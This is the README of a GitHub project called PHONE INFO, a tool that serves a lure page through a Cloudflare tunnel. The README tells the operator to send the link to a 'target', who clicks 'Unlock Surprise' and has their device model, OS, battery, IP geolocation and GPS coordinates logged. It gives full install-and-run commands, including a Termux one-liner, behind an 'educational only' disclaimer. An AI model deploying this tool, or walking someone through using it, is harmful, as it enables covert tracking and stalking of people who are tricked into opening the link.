🎯 PHONE INFO – Advanced Toolkit

<p align="center">
  <img src="https://github.com/shahid2005a/PHONE-INFO-/blob/main/PHONE%20INFO/INFO.png" alt="PHONE INFO Logo" width="600"/>
</p>

<p align="center">
  <img src="https://img.shields.io/github/stars/shahid2005a/PHONE-INFO-?style=for-the-badge&color=yellow" alt="Stars">
  <img src="https://img.shields.io/github/forks/shahid2005a/PHONE-INFO-?style=for-the-badge&color=orange" alt="Forks">
  <img src="https://img.shields.io/github/issues/shahid2005a/PHONE-INFO-?style=for-the-badge&color=red" alt="Issues">
  <img src="https://img.shields.io/github/license/shahid2005a/PHONE-INFO-?style=for-the-badge&color=blue" alt="License">
  <img src="https://img.shields.io/badge/Python-3.7%2B-brightgreen?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
  <img src="https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Cloudflare">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS%20%7C%20Android-lightgrey?style=for-the-badge&logo=linux" alt="Platform">
</p>

⚠️ EDUCATIONAL & RESEARCH PURPOSES ONLY
This tool is designed strictly for ethical security research and authorized penetration testing.
Misuse of this tool is illegal and strictly prohibited.

---

📑 Table of Contents

· ✨ Features
· 🚀 Quick Setup
· 📦 Manual Cloudflared Installation
· 💻 How to Run & Get Public Link
· 🛠️ Troubleshooting Guide
· 📂 Log File Output
· ⚡ Termux Single Command
· 🚨 Legal Warning
· 🤝 Contributing & Support
· 📌 Contact

---

✨ Features

<table>
  <tr>
    <td align="center"><b>📱</b><br>Full Device Model Detection<br><sub>Phones, Laptops, Desktops, Tablets</sub></td>
    <td align="center"><b>🖥️</b><br>OS & Browser Details<br><sub>Windows, macOS, Linux, Android, iOS</sub></td>
    <td align="center"><b>🔋</b><br>Battery Status<br><sub>Level, Charging/Discharging Time</sub></td>
  </tr>
  <tr>
    <td align="center"><b>🌍</b><br>IP Geolocation<br><sub>City, Region, Country, Postal Code, Coordinates</sub></td>
    <td align="center"><b>📍</b><br>Live GPS Tracking<br><sub>Real-time location (with user permission)</sub></td>
    <td align="center"><b>🛜</b><br>Local & Public IP<br><sub>Full network visibility</sub></td>
  </tr>
  <tr>
    <td align="center"><b>🌐</b><br>Cloudflare Tunnel<br><sub>Auto-generates public URL (no port forwarding)</sub></td>
    <td align="center"><b>📂</b><br>Auto Logging<br><sub>Saves all data to <code>device_data.log</code></sub></td>
    <td align="center"><b>⚡</b><br>One‑Line Setup<br><sub>Works across all platforms</sub></td>
  </tr>
</table>

---

🚀 Quick Setup

🪟 Windows (CMD / PowerShell as Admin)

```cmd
git clone https://github.com/shahid2005a/PHONE-INFO-.git
cd PHONE-INFO-
pip install flask flask-cors
python main.py
```

🐧 Linux (Ubuntu/Debian)

```bash
sudo apt update && sudo apt install python3 python3-pip git -y
git clone https://github.com/shahid2005a/PHONE-INFO-.git
cd PHONE-INFO-
pip3 install flask flask-cors
python3 main.py
```

🍎 macOS

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
brew install python git
git clone https://github.com/shahid2005a/PHONE-INFO-.git
cd PHONE-INFO-
pip3 install flask flask-cors
python3 main.py
```

📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python python-pip git
git clone https://github.com/shahid2005a/PHONE-INFO-.git
cd PHONE-INFO-
pip install flask flask-cors
python main.py
```

---

📦 Manual Cloudflared Installation

If the automatic download fails, manually install cloudflared:

OS Command
Linux (AMD64) curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/
macOS (AMD64) curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -o cloudflared && chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/
Windows Download cloudflared-windows-amd64.exe from Releases, rename to cloudflared.exe, and place it in the script folder.

---

💻 How to Run & Get Public Link

1. Run the script using the commands above.
2. Wait for the Flask server to start.
3. You’ll see a Public URL in the terminal:
   ```
   🌐 PUBLIC URL: https://random-name-here.trycloudflare.com
   ```
4. Share this link with the target device.
5. Once the user opens the link and clicks "Unlock Surprise", all device details are logged in the terminal and saved to device_data.log.

---

🛠️ Troubleshooting Guide

Issue Solution
pip: command not found Install pip: sudo apt install python3-pip (Linux) / brew install python (macOS) / pkg install python-pip (Termux)
ModuleNotFoundError: No module named 'flask' Re‑run: pip3 install flask flask-cors
Permission Denied (Linux/macOS) Use sudo before python3 or run chmod +x script.py
Cloudflared not downloading Download manually using the Manual Cloudflared Installation table above.
Port 3000 already in use The script auto‑kills old processes. Manual kill: lsof -i :3000 (Linux/mac) / netstat -ano \| findstr :3000 (Windows)
GPS not working User must click "Allow" on the browser's location permission popup.

---

📂 Log File Output

All captured data is automatically saved to device_data.log in JSON format:

```json
{
  "model": "HP Pavilion 15",
  "brand": "HP",
  "os_name": "Windows",
  "os_version": "10.0",
  "battery_level": 85,
  "public_ip": "1.2.3.4",
  "gps_address": "https://maps.google.com/?q=28.61,77.23"
}
```

---

⚡ Termux Single Command Install

Copy‑paste this one‑liner to install and run on Termux:

```bash
pkg update -y && pkg upgrade -y && pkg install python python-pip git -y && git clone https://github.com/shahid2005a/PHONE-INFO-.git && cd PHONE-INFO- && pip install flask flask-cors && python main.py
```

---

🚨 Legal Warning & Disclaimer

⚠️ CAUTION: DO NOT USE THIS SCRIPT ILLEGALLY!

· This tool collects sensitive personal information (device details, IP, geolocation, GPS, battery status).
· You MUST obtain explicit written consent from the user before sharing the link.
· Using this tool without the target's knowledge is a violation of privacy laws (GDPR, CCPA, IT Act, etc.) and may lead to criminal prosecution.
· The developer (Aryan Afridi) and contributors do not endorse any malicious use of this tool.
· You are 100% responsible for how you use this script.

By downloading or using this script, you agree that:

1. You will use it only for educational purposes or authorized security testing.
2. You will not use it to stalk, harass, or spy on anyone.
3. You accept full legal liability for any consequences resulting from its use.

---

🤝 Contributing & Support

· Developer: Aryan Afridi
· YouTube: @aryanafridi00
· GitHub: shahid2005a

If you find this tool useful, please ⭐ the repository and follow for more security research projects!

---

📌 Contact Me

<p align="center">
  <a href="https://dgtlcyber.netlify.app/">
    <img src="https://img.shields.io/badge/dgtlcyber-Website-2ea44f?style=for-the-badge&logo=link&logoColor=white" alt="Website">
  </a>
  <a href="https://www.youtube.com/@aryanafridi00">
    <img src="https://img.shields.io/badge/Aryan Afridi YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube">
  </a>
  <a href="https://t.me/GsmhackerBot">
    <img src="https://img.shields.io/badge/Telegram Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
  </a>
</p>

---

⚡ DGTL CYBER – Join the Family

<div align="center" style="background: #0a0a0a; padding: 20px; border-radius: 15px;">
  <a href="https://chat.whatsapp.com/JhSEMaGzYk4GbkvEr2i6WI" target="_blank" style="background: #25D366; color: white; padding: 12px 30px; margin: 10px; display: inline-block; border-radius: 30px; text-decoration: none; font-weight: bold;">
    💬 Join Group
  </a>
  <a href="https://whatsapp.com/channel/0029VbD1uw37T8bQVsv5gc2n" target="_blank" style="background: #075E54; color: white; padding: 12px 30px; margin: 10px; display: inline-block; border-radius: 30px; text-decoration: none; font-weight: bold;">
    📢 Follow Channel
  </a>
  <br><br>
  <span style="color: #888;">Stay Updated. Stay Secure. 🔵</span>
</div>

---

<p align="center">
  <b>🚀 Stay Ethical, Stay Safe! 🚀</b>
</p>

---

📜 License: This project is for Educational Purposes Only. No warranty or support is provided. Use at your own risk.
